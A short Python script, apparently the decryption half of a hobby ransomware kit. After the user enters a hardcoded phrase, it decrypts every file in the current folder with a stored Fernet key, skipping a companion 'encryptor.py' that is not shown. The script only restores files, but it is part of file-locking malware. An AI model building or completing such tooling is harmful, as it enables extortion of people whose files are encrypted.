#!/usr/bin/env python3

import os
import time
from cryptography.fernet import Fernet

#colors
green = "\033[32;1m"
red = "\033[31;1m"
#banner
banner = '''      
                                                 
 _|_|_|     _|_|_|     _|      _|     _|       _|_|    
 _|    _|         _|     _|  _|     _|  _|   _|    _|  
 _|_|_|       _|_|         _|       _|  _|     _|_|    
 _|    _|         _|     _|  _|     _|  _|   _|    _|  
 _|    _|   _|_|_|     _|      _|     _|       _|_|    
      		                                       '''

print(banner,"\n")

#finding files
files = []

for file in os.listdir():
	if file == "encryptor.py" or file == "hashed.key" or file == "decryptor.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files,"\n")

#decrypting files with Fernet

with open("hashed.key","rb") as key:
	secretkey = key.read()

#phrase for decrypting files

phrase = "r3x08" #change this!

user_phrase = input("Enter phrase for decrypting files\n")

if user_phrase == phrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		time.sleep(0.1)
		print(green, f"[!]File: {file} has been decrypted!")
else:
		print(red,"[!]U cannot decrypt with this phrase. Enter correct phrase")
